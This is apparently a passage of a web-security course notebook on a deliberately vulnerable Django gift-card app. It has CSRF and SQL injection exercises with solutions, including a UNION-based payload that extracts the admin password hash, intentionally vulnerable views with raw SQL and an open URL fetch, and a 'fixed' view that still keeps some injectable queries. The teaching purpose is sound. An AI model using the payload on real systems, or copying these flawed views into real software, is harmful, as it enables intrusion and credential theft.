> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~25 minutes on this exercise.

Time to fix their code.

Add CSRF protection to the Django application. CSRF protection typically involves:
1. Adding CSRF tokens to all forms
2. Enabling CSRF middleware
3. Validating tokens on state-changing requests
4. Setting secure cookie attributes

Focus on going through the code and identifying where CSRF protection is missing. Update the code, and run the test or ask a TA.

<details>
<summary>Hint: Intermediate steps</summary>
1. Identify forms that need CSRF tokens
2. Add CSRF tokens to those forms
3. verify the forms work
4. verify your attack fails
</details>
"""

def fix_csrf_vulnerability():
    """
    Fix CSRF vulnerability by implementing comprehensive CSRF protection.
    You can do it manually or edit the back end code.
    
    Args:
        None
        
    Returns:
        None
    """
    import os
    import re

    if "SOLUTION":
        # 1. Fix templates - add CSRF tokens to all forms
        template_files = []
        for root, dirs, files in os.walk("templates"):
            for file in files:
                if file.endswith(".html"):
                    template_files.append(os.path.join(root, file))
        
        form_pattern = r'(<form[^>]*method\s*=\s*["\']post["\'][^>]*>)'
        csrf_token = r'\1\n    {% csrf_token %}'
        
        for file_path in template_files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read()
                
                # Only add CSRF token if not already present
                if 'csrf_token' not in content:
                    # Add CSRF token after opening form tag for POST forms
                    if re.search(form_pattern, content, re.IGNORECASE):
                        content = re.sub(form_pattern, csrf_token, content, flags=re.IGNORECASE)
                        
                        with open(file_path, 'w') as f:
                            f.write(content)
                        print(f"Fixed {file_path}")
        
        # 2. Fix views.py - add @csrf_protect decorator to vulnerable views
        views_file = "LegacySite/views.py"
        if os.path.exists(views_file):
            with open(views_file, 'r') as f:
                content = f.read()
            
            # Add import for csrf_protect if not present
            if 'from django.views.decorators.csrf import csrf_protect' not in content:
                import_pattern = r'(from django\..*?import.*?\n)'
                csrf_import = 'from django.views.decorators.csrf import csrf_protect\n'
                
                # Add import after existing Django imports
                if re.search(import_pattern, content):
                    content = re.sub(import_pattern, r'\1' + csrf_import, content, count=1)
                else:
                    # If no Django imports found, add at the top
                    content = csrf_import + content
            
            # Add @csrf_protect decorator to vulnerable view functions
            # Pattern to match function definitions that handle POST requests
            function_pattern = r'(def\s+\w+\([^)]*request[^)]*\):)'
            
            def add_csrf_decorator(match):
                function_def = match.group(1)
                # Check if @csrf_protect is already present above this function
                lines_before = content[:match.start()].split('\n')
                if lines_before and '@csrf_protect' in lines_before[-1]:
                    return function_def
                return '@csrf_protect\n' + function_def
            
            # Apply decorator to view functions
            content = re.sub(function_pattern, add_csrf_decorator, content)
            
            with open(views_file, 'w') as f:
                f.write(content)
            print(f"Fixed {views_file}")
        
        # 3. Fix settings.py - ensure CSRF middleware and security settings
        settings_files = ["GiftcardSite/settings.py"]
        
        for settings_file in settings_files:
            if os.path.exists(settings_file):
                with open(settings_file, 'r') as f:
                    content = f.read()
                
                # Check if CSRF middleware is present
                if 'django.middleware.csrf.CsrfViewMiddleware' not in content:
                    # Add CSRF middleware to MIDDLEWARE list
                    middleware_pattern = r'(MIDDLEWARE\s*=\s*\[)(.*?)(\])'
                    
                    def add_csrf_middleware(match):
                        start = match.group(1)
                        middleware_list = match.group(2)
                        end = match.group(3)
                        
                        # Add CSRF middleware if not present
                        csrf_middleware = "\n    'django.middleware.csrf.CsrfViewMiddleware',"
                        return start + middleware_list + csrf_middleware + "\n" + end
                    
                    content = re.sub(middleware_pattern, add_csrf_middleware, content, flags=re.DOTALL)
                
                # Add CSRF security settings
                csrf_settings = [
                    "SESSION_COOKIE_SAMESITE = 'Strict'",
                    "CSRF_COOKIE_SECURE = True"
                ]
                
                for setting in csrf_settings:
                    setting_name = setting.split(' = ')[0]
                    if setting_name not in content:
                        # Add at the end of the file
                        content += f"\n\n# CSRF Security Settings\n{setting}\n"
                    else:
                        # Update existing setting
                        pattern = rf'{setting_name}\s*=\s*.*'
                        content = re.sub(pattern, setting, content)
                
                with open(settings_file, 'w') as f:
                    f.write(content)
                print(f"Fixed {settings_file}")
    else:
        # TODO: Implement CSRF protection with tokens, middleware, and security settings
        # - Add CSRF tokens to all necessary POST forms in templates
        # - Enable CSRF middleware
        # - Add possible decorators to vulnerable views
        # - Configure secure cookie settings
        pass

"""
<details>
<summary>Solution</summary>

1. Add `{% csrf_token %}` to all POST forms in templates
2. Enable Csrf Middleware in settings
3. Add `@csrf_protect` decorator to vulnerable views
4. Set `SESSION_COOKIE_SAMESITE = 'Strict'` in settings

</details>
"""

def test_fix_csrf_vulnerability(fix_csrf_vulnerability):
    """Test for CSRF vulnerability by checking protection mechanisms"""
    import os
    import time
    from django.test import Client
    from django.conf import settings
    from django.template import engines
    
    # Add testserver to ALLOWED_HOSTS if not already there
    if 'testserver' not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append('testserver')
    
    # Template files to check
    template_files = []
    for root, dirs, files in os.walk("templates"):
        for file in files:
            if file.endswith(".html"):
                template_files.append(os.path.join(root, file))
    
    backups = {}
    
    try:
        
        connection.close()

        # Ensure database file has write permissions
        db_path = 'db.sqlite3'

        if os.path.exists(db_path):
            os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
            print("✓ Database permissions updated")
        
        # Ensure directory has write permissions
        db_dir = os.path.dirname(os.path.abspath(db_path))
        os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
        print("✓ Directory permissions updated")

        # Store original content (vulnerable state)
        for file_path in template_files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    backups[file_path] = f.read()
        
        # Store original settings and views
        backup_files = ["GiftcardSite/settings.py", "LegacySite/views.py"]
        for backup_file in backup_files:
            if os.path.exists(backup_file):
                with open(backup_file, 'r') as f:
                    backups[backup_file] = f.read()
        
        # Apply the fix
        fix_csrf_vulnerability()

        # Test CSRF protection
        client = Client()
        
        # Test 1: Check if templates have CSRF tokens
        csrf_tokens_added = 0
        for file_path in template_files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read()
                
                if 'csrf_token' in content and '<form' in content.lower():
                    csrf_tokens_added += 1
        
        print(f"✓ CSRF tokens added to {csrf_tokens_added} template files")
        
        # Test 2: Check middleware configuration
        csrf_middleware_enabled = False
        settings_file = "GiftcardSite/settings.py"
        if os.path.exists(settings_file):
            with open(settings_file, 'r') as f:
                settings_content = f.read()
            csrf_middleware_enabled = 'django.middleware.csrf.CsrfViewMiddleware' in settings_content
        
        if csrf_middleware_enabled:
            print("✓ CSRF middleware is enabled in settings")
        else:
            print("⚠ CSRF middleware not found in current settings")
        
        if csrf_middleware_enabled:
            print("✓ CSRF middleware is enabled in settings")
        else:
            print("⚠ CSRF middleware not found in current settings")
        
        # Test 3: Check views.py for @csrf_protect decorators
        views_file = "LegacySite/views.py"
        if os.path.exists(views_file):
            with open(views_file, 'r') as f:
                views_content = f.read()
            
            if '@csrf_protect' in views_content:
                csrf_decorators = views_content.count('@csrf_protect')
                print(f"✓ Added @csrf_protect decorators to {csrf_decorators} view functions")
            else:
                print("⚠ No @csrf_protect decorators found in views")
        
        # Test 4: Check security settings
        settings_file = "GiftcardSite/settings.py"
        if os.path.exists(settings_file):
            with open(settings_file, 'r') as f:
                settings_content = f.read()
            
            security_checks = [
                ("SESSION_COOKIE_SAMESITE = 'Strict'", "✓ SESSION_COOKIE_SAMESITE set to Strict"),
                ("CSRF_COOKIE_SECURE = True", "✓ CSRF_COOKIE_SECURE enabled")
            ]
            
            for setting, message in security_checks:
                if setting in settings_content:
                    print(message)
                else:
                    print(f"⚠ Missing security setting: {setting}")

    
    except Exception as e:
        print(f"Error during CSRF test: {e}")
    
    finally:
        # Restore the original vulnerable state after delay
        # time.sleep(200)
        for file_path, original_content in backups.items():
            with open(file_path, 'w') as f:
                f.write(original_content)
            print(f"Restored vulnerable state in {file_path}")


if __name__ == '__main__':
    print("\nTesting CSRF vulnerability fix...")
    test_fix_csrf_vulnerability(fix_csrf_vulnerability)
# %%
"""
## Exercise 3: SQL Injection Vulnerability

SQL injection represents one of the most critical and historically prevalent web application security vulnerabilities, fundamentally arising from improper handling of user-supplied data in database queries. This vulnerability exploits the trust relationship between web applications and their underlying database systems, allowing attackers to manipulate SQL statement structure and execution to gain unauthorized access to sensitive data, modify database contents, or even seize control of entire application infrastructures.

The theoretical foundation of SQL injection attacks rests on how modern web applications frequently construct database queries dynamically by combining user input with predefined SQL statements. While this practice is necessary for creating flexible and interactive applications, it creates a critical security gap when applications fail to properly validate, sanitize, or parameterize user input before incorporating it into SQL queries. The attack succeeds because SQL databases cannot distinguish between legitimate query components and malicious SQL code injected by attackers, provided both are delivered through the same query execution context.

This vulnerability typically occurs when applications use string concatenation or formatting to build SQL queries with user input, rather than using parameterized queries or prepared statements. When user input is directly inserted into SQL strings without proper sanitization, attackers can craft malicious input that breaks out of the intended data context and executes arbitrary SQL commands. The result is that what should be treated as simple data becomes executable code, giving attackers the ability to read, modify, or delete database information far beyond their intended access level.

Real-world examples:
- TalkTalk (2015): Attackers exploited SQL injection in legacy Tiscali-era webpages, accessing a customer database that exposed personal data of 156,959 people, including 15,656 sets of bank account details and sort codes; regulators later found outdated database software and missed prior SQLi activity in July and September 2015 before the major October incident. Official incident timeline and findings: 
[https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-icos-investigation-unfolded/](https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-icos-investigation-unfolded/)

- Sony Pictures (June 2011): The group LulzSec publicly stated it breached SonyPictures.com via a “very simple SQL injection,” exfiltrating user details and posting samples online, highlighting how basic injection flaws can yield broad access when defenses are weak. BBC coverage and statement: 
[https://www.bbc.com/news/business-13636704](https://www.bbc.com/news/business-13636704)

Recommended readings:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQLi labs: https://portswigger.net/web-security/sql-injection
- Django ORM queries: https://docs.djangoproject.com/en/stable/topics/db/queries/

Databases follow exact instructions. If an application mixes user-provided text into those instructions. The database can interpret that text as part of the command itself. Keep query structure separate from the values that fill it, and validating inputs before they reach the database. The essential point: the database should see user input only as data, never as instructions.

<details>
<summary>Vocabulary: SQL Injection Terms</summary>

- **SQL Injection**: Attack technique that injects malicious SQL code into application queries
- **Union-based injection**: Using UNION statements to extract data from other tables
- **Blind SQL injection**: Extracting data when no direct output is visible
- **Parameterized queries**: Using placeholders for user input to prevent injection
- **ORM (Object-Relational Mapping)**: Framework that provides safe database access methods
- **Raw SQL**: Direct SQL queries without ORM protection
- **String concatenation**: Dangerous practice of building queries by joining strings
- **Prepared statements**: Pre-compiled SQL statements that safely handle user input

</details>

### Exercise 3a - implement exploit_sql_injection_vulnerability

> **Difficulty**: 🔴🔴🔴🔴⚪  
> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~25 minutes on this exercise.

Aha the devs are back at it again - they are using string concatenation to build the SQL queries. Perfect ... for SQL injection.

<details>
<summary>Hint: Intermediate steps</summary>
Goal: Craft a malicious card with SQL injection payload. This card is a json file (try buying a card to see how the cards looks like). Upload it to the gift card application. This should reveal admin password hash from the database.
You can paste the malicious card json in `exploit_sql_injection_vulnerability` (if you want to test it).
Good incremental outcomes: Show a change in the html when crafted input is used; identify the errors in the concatenated query construction.
</details>

Feel free to use LLMs for this exercise - I think getting them to help you with SQL injection is a good challenge in itself. 
"""

def exploit_sql_injection_vulnerability():
    """
    Create SQL injection payload for card signature processing.
    
    Args:
        None
        
    Returns:
        bytes: JSON-encoded card data with malicious SQL injection payload to reveal admin password hash
    """

    if "SOLUTION":
        # Create a malicious signature that attempts SQL injection
        sql_injection_payload = "' UNION SELECT id || '-' || username || '-' || password FROM LegacySite_user WHERE username='admin' -- "

        # Create a card with the malicious signature
        card_data = {
            "merchant_id": "GPT-4 API Credits",
            "customer_id": "test2",
            "total_value": 500,
            "records": [
                {
                    "record_type": "amount_change",
                    "amount_added": 2000,
                    "signature": sql_injection_payload
                }
            ]
        }

        # Convert to JSON and then to bytes
        card_json = json.dumps(card_data).encode('utf-8')
        
        return card_json
    
    else:
        # TODO: Create malicious card with SQL injection payload
        # - Create a payload that breaks out of the original query
        # - Target admin credentials from the database
        return {} # your card json

def test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability):
    """Test SQL injection vulnerability exploitation"""
    # Backup the database before running test
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'

    # Please comment the last two lines in LegacySite/views.py
    
    try:
        # Ensure database permissions are correct
        connection.close()

        # Ensure database file has write permissions
        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")
        
        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        # Load test data
        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")
            # Continue with existing data if loading fails
        
        from django.test import Client
        from django.conf import settings
        
        # Add testserver to ALLOWED_HOSTS if not already there
        if 'testserver' not in settings.ALLOWED_HOSTS:
            settings.ALLOWED_HOSTS.append('testserver')
        
        # Create a client and set up test user
        client = Client()
        username, password = 'test6', 'test6'
        
        # Register and login test user
        def register_user(client, username, password):
            try:
                from LegacySite.models import User
                existing_user = User.objects.get(username=username)
                print(f"User '{username}' already exists, skipping registration")
                can_login = client.login(username=username, password=password)
                return can_login
            except User.DoesNotExist:
                endpoint = '/register'
                data = {'uname': username, 'pword': password, 'pword2': password}
                client.post(path=endpoint, data=data)
                can_login = client.login(username=username, password=password)
                return can_login

        # Set up the test user
        register_user(client, username, password)
        client.login(username=username, password=password)
        
        
        # Get the exploit payload
        card_json = exploit_sql_injection_vulnerability()
        

        print(f"Attempting SQL injection via card upload...")

        try:
            # Upload the card through the use_card_view
            response = client.post('/use.html', {
                'card_supplied': 'True',
                'card_fname': 'test_sqli',
                'card_data': io.BytesIO(card_json)
            })

            print(f"SQL injection response status: {response.status_code}")
            
            if response.status_code == 200:
                response_content = response.content.decode()
                
                # Check if the response contains admin information (indicating successful injection)
                if 'admin' in response_content.lower():
                    print("[+] SQL injection vulnerability successfully exploited!")
                    print("[+] Admin information found in response")
                    return True
                else:
                    print("[-] SQL injection payload may have been blocked or sanitized")
                    return False
            else:
                print(f"[-] Request failed with status {response.status_code}")
                return False
                
        except Exception as e:
            print(f"Error during SQL injection exploit: {e}")
            return False
        
    except Exception as e:
        print(f"Error during SQL injection test: {e}")
        return False
        
    finally:
        # Always restore the original database
        if os.path.exists(backup_path):
            shutil.move(backup_path, db_path)
            print(f"✓ Database restored from backup")


if __name__ == '__main__':
    test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)

# %%
"""
### Exercise 3b - implement fix_sql_injection_vulnerability

> **Difficulty**: 🔴🔴🔴🔴🔴  
> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~30 minutes on this exercise.

Implement the `fix_sql_injection_vulnerability` function that eliminates SQL injection vulnerabilities by replacing raw SQL queries with secure Django ORM operations.

SQL injection protection typically involves:
1. Using parameterized queries or ORM methods
2. Input validation and sanitization
3. Proper error handling to prevent information disclosure
4. Authentication and authorization checks
5. JSON validation for structured data

Editing this function is optional as long as you fix the vulnerability in the backend.
Good incremental outcomes: Introduce filters for one path; validate JSON; add basic error handling that avoids leaking internals.
"""

def fix_sql_injection_vulnerability():
    """
    Fixed version of use_card_view that eliminates SQL injection vulnerabilities.
    Feel free to edit `use_card_view(request)` here or in the server side code.
    
    Args:
        None
        
    Returns:
        function: The secure use_card_view function
    """
    import tempfile
    import json
    import os
    from django.shortcuts import render, redirect
    from django.http import HttpResponse
    from django.core.exceptions import ObjectDoesNotExist
    from LegacySite.models import Card, Product
    from LegacySite import extras
    
    if "SOLUTION":
        def use_card_view(request):
            # from . import extras
            context = {'card_found': None}
            
            if request.method == 'GET':
                if not request.user.is_authenticated:
                    return redirect("login.html")
                try:
                    # SECURE: Using Django ORM instead of raw SQL
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                context['card'] = None
                return render(request, 'use-card.html', context)

            elif request.method == "POST" and request.POST.get('card_url_supplied', False):
                # Post with URL-based card, fetch and use this card.
                context['card_list'] = None
                card_url = request.POST.get('card_url', None)
                card_fname = request.POST.get('card_fname', None)
                card_error_data = 'Could not read response'
                
                if card_url is None or card_url == '':
                    return HttpResponse("ERROR: No URL provided.")
                
                # SECURE: Add URL validation to prevent SSRF attacks
                import urllib.parse
                
                try:
                    parsed_url = urllib.parse.urlparse(card_url)
                    
                    # Only allow HTTPS URLs from pastebin.com
                    if parsed_url.scheme != 'https':
                        return HttpResponse("ERROR: Only HTTPS URLs are allowed.")
                    
                    if parsed_url.hostname != 'pastebin.com':
                        return HttpResponse("ERROR: Only pastebin.com URLs are allowed.")
                    
                    # Validate the URL path format
                    if not parsed_url.path.startswith('/raw/'):
                        return HttpResponse("ERROR: Invalid pastebin URL format.")
                        
                except Exception:
                    return HttpResponse("ERROR: Invalid URL format.")
                
                try:
                    import urllib.request
                    # SECURE: Only fetch from validated pastebin URLs
                    validated_url = f'https://pastebin.com{parsed_url.path}'
                    print(f'Fetching from validated URL: {validated_url}')
                    
                    try:
                        with urllib.request.urlopen(validated_url) as response:
                            card_file_data = response.read()
                            card_error_data = card_file_data
                    except urllib.error.HTTPError as e:
                        return HttpResponse(f"ERROR: Failed to fetch card from URL. HTTP {e.code}")
                    except Exception as e:
                        print(e)
                        return HttpResponse("ERROR: Failed to fetch card from URL.")
                    
                    if card_fname is None or card_fname == '':
                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
                    
                    card_data = extras.parse_card_data(card_file_data, card_file_path)
                    # check if we know about card.
                    print(card_data.strip())
                    signature = json.loads(card_data)['records'][0]['signature']
                    # signatures should be pretty unique, right?
                    card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                    user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
                    card_query_string = ""
                    print("Found %s cards" % len(card_query))
                    for thing in card_query:
                        # print cards as strings
                        card_query_string += str(thing) + '\n'
                    if len(card_query) == 0:
                        # card not known, add it.
                        if card_fname is not None:
                            card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        else:
                            card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        fp = open(card_file_path, 'wb')
                        fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
                        fp.close()
                        card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                    else:
                        context['card_found'] = card_query_string
                        try:
                            card = Card.objects.get(data=card_data)
                            card.used = True
                            card.save()
                        except ObjectDoesNotExist:
                            print("No card found with data =", card_data)
                            card = None
                    context['card'] = card
                    return render(request, "use-card.html", context)
                except Exception as e:
                    return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")
                
            elif request.method == "POST" and request.POST.get('card_supplied', False):
                # SECURE: Authentication check added
                if not request.user.is_authenticated:
                    return redirect("login.html")
                    
                # Post with specific card, use this card.
                context['card_list'] = None
                
                # Need to write this to parse card type.
                card_file_data = request.FILES['card_data']
                card_fname = request.POST.get('card_fname', None)
                
                if card_fname is None or card_fname == '':
                    card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_parser.gftcrd')
                else:
                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
                    
                card_data = extras.parse_card_data(card_file_data.read(), card_file_path)
                
                # SECURE: Added comprehensive JSON validation
                try:
                    card_json = json.loads(card_data)
                    
                    # Validate total_value is positive
                    total_value = card_json.get('total_value')
                    if total_value is None:
                        return HttpResponse("Invalid card: negative or missing value", status=400)
                        
                    # Validate signature exists and is safe
                    if not card_json.get('records') or not isinstance(card_json['records'], list) or len(card_json['records']) == 0:
                        return HttpResponse("Invalid card: missing or invalid records", status=400)
                        
                except json.JSONDecodeError:
                    return HttpResponse("Invalid card: malformed JSON", status=400)
                
                # check if we know about card.
                print(card_data.strip())
                signature = json.loads(card_data)['records'][0]['signature']
                card_json = json.loads(card_data)
                prod = json.loads(card_data)['merchant_id']
                
                if prod is None:
                    return HttpResponse("Invalid card: missing product", status=400)
                
                # Get initial total_value
                total_value = 0
                if 'total_value' in card_json:
                    total_value = int(card_json['total_value'])
                    
                # Add all amount_added values from records
                if 'records' in card_json and isinstance(card_json['records'], list):
                    for record in card_json['records']:
                        if 'amount_added' in record:
                            try:
                                amount_added = int(record['amount_added'])
                                total_value += amount_added
                            except ValueError:
                                # Skip invalid amount_added values
                                pass
                                
                if total_value < 0:
                    return HttpResponse("Invalid card: negative total value", status=400)
                
                # SECURE: Instead of using raw SQL with LIKE on encrypted data,
                # fetch all cards for the user and check signatures in Python
                user_cards = Card.objects.filter(user=request.user)
                matching_cards = []
                
                for card in user_cards:
                    try:
                        # The data is automatically decrypted when accessed
                        card_data_dict = json.loads(card.data[2:-1])
                        if ('records' in card_data_dict and 
                            card_data_dict['records'][0]['signature'] == signature):
                            matching_cards.append(card)
                    except (json.JSONDecodeError, UnicodeDecodeError, IndexError, KeyError):
                        continue
                
                card_query_string = ""
                for card in matching_cards:
                    card_query_string += str(card) + '\n'
                    
                print(f"Found {len(matching_cards)} cards")
                
                if len(matching_cards) == 0:
                    # Get count of user's cards for naming
                    user_card_count = Card.objects.filter(user=request.user).count()
                    
                    # card not known, add it.
                    if card_fname is not None:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_card_count + 1}.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_{user_card_count + 1}.gftcrd')
                        
                    fp = open(card_file_path, 'wb')
                    fp.write(card_data)
                    fp.close()
                    
                    product = Product.objects.get(product_name=prod)
                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True, 
                            product=product, amount=total_value)
                    card.save()
                else:
                    context['card_found'] = card_query_string
                    try:
                        # Use the first matching card
                        card = matching_cards[0]
                        card.used = True
                        card.save()
                    except IndexError:
                        print("No card found with matching signature")
                        card = None
                        
                context['card'] = card
                return render(request, "use-card.html", context)
                
            elif request.method == "POST":
                # SECURE: Authentication check added
                if not request.user.is_authenticated:
                    return redirect("login.html")
                    
                card_id = request.POST.get('card_id', None)
                if card_id is None:
                    return HttpResponse("No card specified", status=400)
                    
                try:
                    card = Card.objects.get(id=card_id)
                    # SECURE: Authorization check to ensure user owns the card
                    if card.user != request.user:
                        return HttpResponse("Unauthorized", status=403)
                        
                    card.used = True
                    card.save()
                except ObjectDoesNotExist:
                    return HttpResponse("Card not found", status=404)
                    
                context['card'] = card
                try:
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                return render(request, "use-card.html", context)
                
            return HttpResponse("Error 404: Internal Server Error")
        
        return use_card_view

    else:
        def use_card_view(request):
            context = {'card_found':None}
            if request.method == 'GET':
                if not request.user.is_authenticated:
                    return redirect("login.html")
                try:
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                context['card'] = None
                return render(request, 'use-card.html', context)
            elif request.method == "POST" and request.POST.get('card_url_supplied', False):
                # Post with URL-based card, fetch and use this card.
                context['card_list'] = None
                card_url = request.POST.get('card_url', None)
                card_fname = request.POST.get('card_fname', None)
                card_error_data = 'Could not read response'
                
                if card_url is None or card_url == '':
                    return HttpResponse("ERROR: No URL provided.")
                
                try:
                    import urllib.request
                    # Fetch card data from URL
                    print('https://pastebin.com/raw/'+ card_url.split('/')[-1])
                    try:
                        with urllib.request.urlopen('https://pastebin.com/raw/'+ card_url.split('/')[-1]) as response:
                            card_file_data = response.read()
                            card_error_data = card_file_data
                    except urllib.error.HTTPError as e:
                        if e.code == 404:
                            # If 404, try the URL directly
                            with urllib.request.urlopen(card_url) as response:
                                card_file_data = response.read()
                                card_error_data = card_file_data
                        else:
                            raise
                    except Exception as e:
                        print(e)
                    
                    if card_fname is None or card_fname == '':
                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
                    
                    card_data = extras.parse_card_data(card_file_data, card_file_path)
                    # check if we know about card.
                    print(card_data.strip())
                    signature = json.loads(card_data)['records'][0]['signature']
                    # signatures should be pretty unique, right?
                    card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                    user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
                    card_query_string = ""
                    print("Found %s cards" % len(card_query))
                    for thing in card_query:
                        # print cards as strings
                        card_query_string += str(thing) + '\n'
                    if len(card_query) == 0:
                        # card not known, add it.
                        if card_fname is not None:
                            card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        else:
                            card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        fp = open(card_file_path, 'wb')
                        fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
                        fp.close()
                        card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                    else:
                        context['card_found'] = card_query_string
                        try:
                            card = Card.objects.get(data=card_data)
                            card.used = True
                            card.save()
                        except ObjectDoesNotExist:
                            print("No card found with data =", card_data)
                            card = None
                    context['card'] = card
                    return render(request, "use-card.html", context)
                except Exception as e:
                    return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")
                
            elif request.method == "POST" and request.POST.get('card_supplied', False):
                # Post with specific card, use this card.
                context['card_list'] = None
                # Need to write this to parse card type.
                card_file_data = request.FILES['card_data']
                card_fname = request.POST.get('card_fname', None)
                if card_fname is None or card_fname == '':
                    card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_parser.gftcrd')
                else:
                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
                card_data = extras.parse_card_data(card_file_data.read(), card_file_path)
                # check if we know about card.
                print(card_data.strip())
                signature = json.loads(card_data)['records'][0]['signature']
                # signatures should be pretty unique, right?
                card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
                card_query_string = ""
                print("Found %s cards" % len(card_query))
                for thing in card_query:
                    # print cards as strings
                    card_query_string += str(thing) + '\n'
                if len(card_query) == 0:
                    # card not known, add it.
                    if card_fname is not None:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    fp = open(card_file_path, 'wb')
                    fp.write(card_data)
                    fp.close()
                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                else:
                    context['card_found'] = card_query_string
                    try:
                        card = Card.objects.get(data=card_data)
                        card.used = True
                        card.save()
                    except ObjectDoesNotExist:
                        print("No card found with data =", card_data)
                        card = None
                context['card'] = card
                return render(request, "use-card.html", context) 
            elif request.method == "POST":
                card = Card.objects.get(id=request.POST.get('card_id', None))
                card.used=True
                card.save()
                context['card'] = card
                try:
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                return render(request, "use-card.html", context)
            return HttpResponse("Error 404: Internal Server Error")

        # TODO: Replace raw SQL queries with Django ORM
        # - Use safe ORM methods
        # - Use parameterized queries
        # - Validate JSON data before processing
        return use_card_view

"""
<details>
<summary>Hints</summary>

1. Replace `Card.objects.raw()` with `Card.objects.filter()`
2. Use Django ORM methods instead of string formatting in SQL
3. Add JSON validation before processing card data
4. Implement proper authentication checks
5. Add input sanitization for card signatures

</details>
"""

def test_fix_sql_injection_vulnerability(fix_sql_injection_vulnerability):
    import importlib
    from LegacySite import views
    importlib.reload(views)
    
    
    views_file = "LegacySite/views.py"
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'
    
    try:
        # Step 1: Ensure database permissions are correct
        connection.close()

        # Ensure database file has write permissions
        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")
        
        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
